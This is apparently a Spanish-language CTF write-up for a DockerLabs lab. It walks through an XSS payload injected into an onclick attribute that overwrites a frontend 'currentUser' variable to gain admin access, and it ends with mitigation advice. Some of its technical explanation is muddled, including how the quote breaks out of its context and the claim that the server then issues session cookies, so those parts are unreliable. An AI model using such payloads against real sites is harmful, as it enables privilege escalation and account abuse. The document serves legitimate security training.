# 🧨 Writeup CTF – XSS para Escalada a Admin (DockerLabs)

## 📌 Resumen
En este laboratorio se explota una vulnerabilidad **XSS** presente en el campo *descripción* de una máquina.  
Mediante la inyección de JavaScript es posible romper el contexto del atributo `onclick`, ejecutar código arbitrario y modificar una variable global, logrando así la escalada a **administrador**.

---

## 🎯 Objetivo
- Identificar una vulnerabilidad XSS
- Ejecutar JavaScript en el navegador
- Convertir un usuario normal en **admin**
- Acceder al endpoint `/dashboard`

---

## 🔍 Análisis del Punto Vulnerable

En el HTML de la aplicación se observa el siguiente patrón:

```html
<button
  onclick="descripcion('Vulnerable', 'DESCRIPCION_AQUI'); event.stopPropagation();">
  Descripción
</button>
```

La descripción se inserta directamente dentro del atributo `onclick`, lo cual es peligroso si el contenido no se valida correctamente.

---

## 🔑 Variable Sensible

En el código fuente también aparece la siguiente variable global:

```html
<script>
    var currentUser = "pupin";
</script>
```

Esta variable controla el rol del usuario **desde el frontend**, sin validación en backend.

---

## 💣 Payload (Query) Utilizado

```text
"><script>currentUser="admin";alert("Rol cambiado a: "+currentUser);</script>
```

---

## 🧩 Explicación del Payload

### 1️⃣ Cierre del string JavaScript
```text
"
```
Cierra el string esperado dentro del `onclick`.

---

### 2️⃣ Salida del atributo HTML
```text
>
```
Finaliza el atributo `onclick`, permitiendo insertar código propio.

---

### 3️⃣ Inserción de JavaScript
```text
<script>
```
Se inicia un bloque JavaScript ejecutable por el navegador.

---

### 4️⃣ Escalada de privilegios
```text
currentUser="admin";
```
Sobrescribe la variable global definida previamente:

```text
var currentUser = "pupin";
```

Ahora el usuario pasa a ser tratado como administrador.

---

### 5️⃣ Confirmación visual
```text
alert("Rol cambiado a: "+currentUser);
```

Se muestra el mensaje:
```
Rol cambiado a: admin
```

Confirmando que el XSS fue exitoso.

---

### 6️⃣ Cierre del script
```text
</script>
```

Evita romper el DOM y permite que la página siga funcionando.

---

## ❌ Por qué la protección falla

En el archivo `descripciones.js` existe una función de escape:

```text
escapeHtml()
```

Sin embargo:
- El payload se ejecuta **antes** de que la función `descripcion()` sea llamada
- El escape ocurre demasiado tarde
- El atributo `onclick` ya fue interpretado por el navegador

---

## 🔓 Acceso al Dashboard

Tras ejecutar el payload:

1. `currentUser` pasa a ser `admin`
2. El frontend habilita funciones restringidas
3. Se accede correctamente a `/dashboard`
4. El servidor devuelve cookies de sesión válidas

---

## 🧠 Impacto

- Ejecución de JavaScript arbitrario
- Escalada de privilegios
- Control del panel administrativo
- Vulnerabilidad crítica de tipo XSS

---

## 🛡️ Mitigación

- No usar atributos `onclick` con datos de usuario
- Usar `addEventListener`
- Validar roles en backend
- Nunca confiar en variables del frontend

---

## 🏁 Conclusión

La vulnerabilidad se debe a una mala gestión del contexto JavaScript dentro de atributos HTML, permitiendo XSS y la modificación de variables críticas de control de acceso.

**CTF completado con éxito ✅**
